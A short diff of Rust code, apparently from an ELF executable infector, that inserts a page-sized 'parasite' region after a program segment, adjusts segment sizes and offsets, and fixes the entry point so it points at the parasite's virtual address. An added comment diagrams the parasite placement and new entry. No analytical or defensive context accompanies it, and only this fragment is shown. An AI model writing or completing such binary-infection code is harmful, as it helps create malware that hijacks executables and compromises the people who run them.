@@ -47,8 +47,15 @@ fn main() -> Result<()> {
 	let insert_off = xphdr.p_offset + xphdr.p_filesz;
 	let pagesize = unsafe { libc::sysconf(libc::_SC_PAGESIZE) as u64 };
 
+/*
+	  vaddr								       parasite
+		|-----------|-------------------|-------------------|
+	   off        entry             off + size
+									new entry
+ */
+
 	/* Update every offset after insertion */
-	ehdr.e_entry = xphdr.p_offset + xphdr.p_filesz;
+	ehdr.e_entry = xphdr.p_vaddr + xphdr.p_filesz;
 	xphdr.p_filesz += pagesize;
 	xphdr.p_memsz += pagesize;
 	update_offset!(ehdr.e_phoff, insert_off, pagesize);
